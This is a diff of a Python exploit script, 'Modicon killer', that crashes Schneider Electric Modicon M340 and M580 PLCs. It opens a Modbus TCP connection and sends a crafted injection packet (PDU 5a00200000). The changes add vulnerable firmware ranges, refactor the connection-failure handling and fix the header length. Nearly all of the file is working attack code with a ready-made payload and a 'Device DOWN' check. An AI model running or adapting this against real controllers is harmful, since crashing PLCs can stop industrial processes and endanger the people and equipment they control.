@@ -25,37 +25,38 @@ banner = '''
 	| $$ \  $$| $$| $$| $$|  $$$$$$$| $$                                      
 	|__/  \__/|__/|__/|__/ \_______/|__/   
 
-		Modicon killer v1.0
+		Modicon killer v1.0.1
 '''
 
 bannerInfo = '''
- # Exploit Title: \t"Dos Modicon via Modbus Injection" 
- # CVE: \t\t---------------
+ # Exploit Title: \t"DOS Modicon via Modbus Injection" 
+ # CVE: \t\t2018-???? <-- soon !!!
  # CVSS Base Score v3: \t8.6 / 10
  # CVSS Vector String:\tAV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H  
  # Date: \t\t2/01/2018
  # Exploit Author: \tFernandez Ezequiel ( @capitan_alfa ) && Bertin Jose ( @bertinjoseb )
  # Vendor: \t\tSchneider Electric
- # devices(tested): \tPLC Modicon m340 (v2.0 > v2.8) & m580
-
+ # Devices vuln(tested):
+			PLC Modicon m340 (v2.0 > v2.8) \t\t ( fix: v2.9 )
+ 			PLC Modicon m580 (v01.04 > v02.12) \t ( fix: v??? )
  '''
 
 parser = argparse.ArgumentParser(prog='mdKiller.py',
-								description=' [+] DOS Modicon via Modbus Injection.', 
+								description=' [+] DOS Modicon via Modbus Injection. (CVE: 2018-???? )', 
 								epilog='[+] Demo: mdKiller.py --sid 00 --host <target> --check/kill',
 								version="1.0")
 
-parser.add_argument('--sid', dest="SlaveID",  help='Slave ID (default 00)', default="00")
-parser.add_argument('--host', dest="HOST",  help='Host',required=True)
-parser.add_argument('--port', dest="PORT",  help='Port (default 502)',type=int,default=502)
+parser.add_argument('--sid',  dest="SlaveID", help='Slave ID (default 00)', default="00")
+parser.add_argument('--host', dest="HOST",    help='Host',required=True)
+parser.add_argument('--port', dest="PORT",    help='Port (default 502)',type=int,default=502)
 
-parser.add_argument('--check', dest="CHECK",  help='Show device info ',action="store_true")
-parser.add_argument('--kill', dest="KILL",  help='Check availability',action="store_true")
+parser.add_argument('--check',dest="CHECK",   help='Show device info ',action="store_true")
+parser.add_argument('--kill', dest="KILL",    help='Check availability',action="store_true")
 
 args        	= 	parser.parse_args()
 
 HST   			= 	args.HOST
-SID 			= 	str(args.SlaveID) ### ---> hex no int !!!!
+SID 			= 	str(args.SlaveID) # now hex (00 to ff). switch to int (0 to 255) !!!!
 portModbus		= 	args.PORT
 checkDOS		= 	bool(args.CHECK)
 killerPLC 		= 	bool(args.KILL)
@@ -88,6 +89,14 @@ _modbus_obj_description = {
 						128: "Private objects",
 						255: "Private objects"		
 }
+def noConnection():
+	print Colors.BLUE+"\n // ------------------------------------------------- //"
+	print Colors.RED+"\t [!] Fail Connection "
+	print Colors.RED+"\t [!] GAME OVER"
+	print Colors.GREEN+"\t [+] Device DOWN"	
+	print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT		
+	sys.exit(0)
+
 func_code 	= '2b'  # Device Identification
 meiType 	= '0e'  # MODBUS Encapsulated Interface - 0e / 0d
 read_code	= '03'  # 01 / 02 / 03 / 04 
@@ -96,17 +105,14 @@ obj_id 		= '00'
 # --MBAP 7 Bytes --------------------------------------------------------  #
 # Return a string with the modbus header
 def create_header_modbus(length,unit_id):
-    trans_id = "6464"
+    trans_id = "4462"
     proto_id = "0000"
     protoLen = length.zfill(4)
     unit_id = unit_id
 
     return trans_id + proto_id + protoLen + unit_id.zfill(2)
 
-#0022000005005a00200000
-
 modbusRequest = 	create_header_modbus('5',SID)
-
 modbusRequest +=	func_code
 modbusRequest += 	meiType
 modbusRequest += 	read_code
@@ -120,45 +126,30 @@ def get_obj_DevInfo(reqMD):
 		client.connect((HST,int(portModbus)))
 	except Exception, e:
 	 	if str(e) == "timed out":
-		 	print Colors.BLUE+"\n // ------------------------------------------------- //"
-			print Colors.RED+"\t [+] GAME OVER"	
-			print Colors.GREEN+"\t [+] Device DOWN !!!"	
-			print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT	 		
-			print "\n"	
+			noConnection()
 	 	else:
-	 		#print str(e)
 		 	print Colors.GREEN+" [+] "+str(e)+Colors.DEFAULT
-		 	print Colors.BLUE+"\n // ------------------------------------------------- //"
-			print Colors.RED+"\t [+] GAME OVER"	
-			print Colors.GREEN+"\t [+] Device DOWN !!!"	
-			print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT	
-		sys.exit(0)
+			noConnection()                      
 	
-	# ------------------------------------------------------------------------------------
-	request2  = Colors.RED+reqMD+Colors.DEFAULT
-
 	client.send(reqMD.decode('hex'))
 
 	try:
-		aResponse1 = client.recv(2048)
+		# Tendremos respuesta ?
+		MbResponse = client.recv(2048)
 	except Exception, e:
-	 	print Colors.GREEN+str(e)+Colors.DEFAULT
+		if str(e) == "timed out":
+		 	print Colors.GREEN+str(e)+Colors.DEFAULT
 
-	 	print Colors.BLUE+"\n // ------------------------------------------------- //"
-		print Colors.RED+"\t [+] GAME OVER"	
-		print Colors.GREEN+"\t [+] Device DOWN !!!"	
-		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
-	 	#print Colors.RED+"DOWN !!!"+Colors.DEFAULT
+		 	print Colors.BLUE+"\n // ------------------------------------------------- //"
+			print Colors.RED+"\t [+] GAME OVER"	
+			print Colors.GREEN+"\t [+] Device DOWN !!!"	
+			print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
+		else:
+			print Colors.GREEN+str(e)+Colors.DEFAULT
 		sys.exit(0)
+	
+	aframe = MbResponse.encode('hex')
 
-	#time.sleep(0.7) ###########################################################################
-
-
-	resp = aResponse1.encode('hex')
-
-
-	aframe  = resp
-	print "\n"
 	print  Colors.BLUE+' [+] Host: \t\t' +Colors.RED+HST+Colors.DEFAULT
 	print  Colors.BLUE+' [+] Port: \t\t' +Colors.ORANGE+str(portModbus)+Colors.DEFAULT
 	print  Colors.BLUE+' [+] Slave ID: \t\t' +Colors.RED+aframe[12:14]+Colors.DEFAULT
@@ -175,8 +166,6 @@ def get_obj_DevInfo(reqMD):
 			objTot = '0'
 			nObjeto = int('0',10)
 
-	
-
 		print Colors.BLUE+' [+] TotalObj: \t\t'+Colors.RED+str(nObjeto)+Colors.DEFAULT
 		print ''
 		pInicial = 28
@@ -185,8 +174,7 @@ def get_obj_DevInfo(reqMD):
 			pInicial+=4
 			longitud = aframe[pInicial-2:pInicial]
 			longitud = int(longitud,16) 
-				
-						
+							
 			valueStr = aframe[pInicial:pInicial+longitud *2 ]
 			objVal   = valueStr.decode("hex")
 
@@ -198,62 +186,57 @@ def get_obj_DevInfo(reqMD):
 			print Colors.BOLD+ " [*]  "+Colors.GREEN+ obj_nm +': \t'+Colors.ORANGE+objVal+Colors.DEFAULT
 			pInicial+=longitud*2
 	
-
 	except Exception, e:
 		print  Colors.BR_COLOUR+Colors.RED+'\n [!] no device info' + Colors.DEFAULT
 		print e
-		print 'fail 2'
-	
 	client.close()
 
 	print "\n"
 
 def plcKiller(pduInjection):
 	reqst = {}
-	reqst[0] =	create_header_modbus('5',SID)
+	lenPdu = str((len(pduInjection)/2)+1)
+	#reqst[0] =	create_header_modbus('5',SID) # jugando con 
+	reqst[0] =	create_header_modbus(lenPdu,SID)
 	reqst[1] =	pduInjection
 
-	#fnc = pduInjection #[:2]
-
-	MB_Request = 	reqst[0]
-	MB_Request +=	reqst[1]
+	MB_Request = 	reqst[0] # header
+	MB_Request +=	reqst[1] # pdu
 
 	try:
-
 		client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		client.settimeout(2)
 		client.connect((HST,portModbus))
 
 	except Exception, e:
-
-		print "GAME OVER.\nNo connection:"
-	 	print e
-		sys.exit(0)
+		noConnection()		
 
 	mbKiller = MB_Request.decode('hex')
 	
-	injection = Colors.ORANGE+mbKiller.encode("hex")+Colors.DEFAULT
-	print " [+] Injection: \t"+injection
+	injection = Colors.GREEN+reqst[0]+Colors.RED+reqst[1]+Colors.DEFAULT
+	print " [+] Bad Injection: \t"+injection
 
 	client.send(mbKiller)
+	
 	try:
-		aResponse1 = (client.recv(1024))#.encode("hex")		
-		print " [+] Response: \t\t"+aResponse1.encode("hex")
-		print " [+] Response(dec): \t"+aResponse1
-	    #client.recv(1024)
+		modResponse = (client.recv(1024))	
+		print " [+] Response: \t\t"+modResponse.encode("hex")
+		print " [+] Response(dec): \t"+modResponse
+
+		print Colors.BLUE+"\n // ------------------------------------------------- //"
+		print Colors.ORANGE+"\t [+] NO vulnerable"	
+		print Colors.GREEN+"\t [+] Device UP !!!"	
+		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
 	except Exception, e:
-	 	print Colors.GREEN+str(e)+Colors.DEFAULT
+	 	print " [!] No Response: \t"+Colors.RED+str(e)+Colors.DEFAULT
 		print Colors.BLUE+"\n // ------------------------------------------------- //"
 		print Colors.RED+"\t [+] Vulnerable"	
+		print Colors.ORANGE+"\t [!] GAME OVER"
 		print Colors.GREEN+"\t [+] Device DOWN !!!"	
 		print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT		
-		sys.exit(0)
-
-	print Colors.BLUE+"\n // ------------------------------------------------- //"
 	
-	print Colors.ORANGE+"\t [+] NO vulnerable"	
-	print Colors.GREEN+"\t [+] Device UP !!!"	
-	print Colors.BLUE+" // ------------------------------------------------- //\n\n"+Colors.DEFAULT
+	client.close()
+	sys.exit(0)
 
 def main():
 	print Colors.GREEN+banner+Colors.DEFAULT
@@ -264,13 +247,9 @@ def main():
 		get_obj_DevInfo(modbusRequest)	
 
 	elif killerPLC == True:
-		plcKiller(pduInjection="5a00200000")
-
+		# contemplar injectiones manuales !!!
+		plcKiller(pduInjection="5a00200000") 
 	else:
-
 		sys.exit(0)
 
-
 main()
-
-#modicon #m580 (la joya de @SchneiderElec) tmb ha caido
